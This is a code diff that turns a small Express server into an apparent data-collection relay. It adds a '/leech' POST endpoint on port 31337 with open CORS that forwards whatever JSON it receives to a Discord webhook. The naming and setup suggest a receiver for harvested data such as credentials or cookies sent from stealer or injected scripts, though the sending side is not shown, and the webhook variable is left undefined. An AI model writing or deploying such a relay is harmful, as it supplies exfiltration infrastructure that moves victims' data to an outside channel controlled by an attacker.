@@ -1,13 +1,28 @@
 const express = require('express');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const request = require('request');
 const app = express();
-const port = 1337;
+const port = 31337;
+
+app.use('*', cors({}));
+app.use(bodyParser.json());
 
 app.post('/leech', (req, res) => {
-  // res.send('Hello World!');
   const information = req.body;
-  console.log('information', information);
+  request.post(
+    discordWebhookAPI, 
+    {
+      body: JSON.stringify(information),
+      headers: {
+        'Content-type': 'application/json',
+        'accept': 'application/json'
+      },
+    }
+  );
+  res.send('ok');
 });
 
-app.listen(port, () => {
+app.listen(port, '127.0.0.1', () => {
   console.log(`App listening on port ${port}`);
 });
